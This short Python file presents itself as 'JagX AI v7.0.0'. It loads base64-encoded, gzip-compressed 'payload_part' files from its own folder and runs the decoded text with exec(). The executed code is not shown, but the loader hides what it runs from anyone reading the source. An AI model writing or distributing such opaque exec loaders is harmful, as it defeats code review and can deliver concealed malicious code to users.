"""JagX AI v7.0.0. Created by JagX & JRILICENSE."""
import gzip, base64, pathlib
_base = pathlib.Path(__file__).parent
_names = sorted([n.name for n in _base.glob("payload_part*.b64")])
_C = "".join((_base / n).read_text() for n in _names)
exec(gzip.decompress(base64.b64decode(_C)).decode("utf-8"), globals())
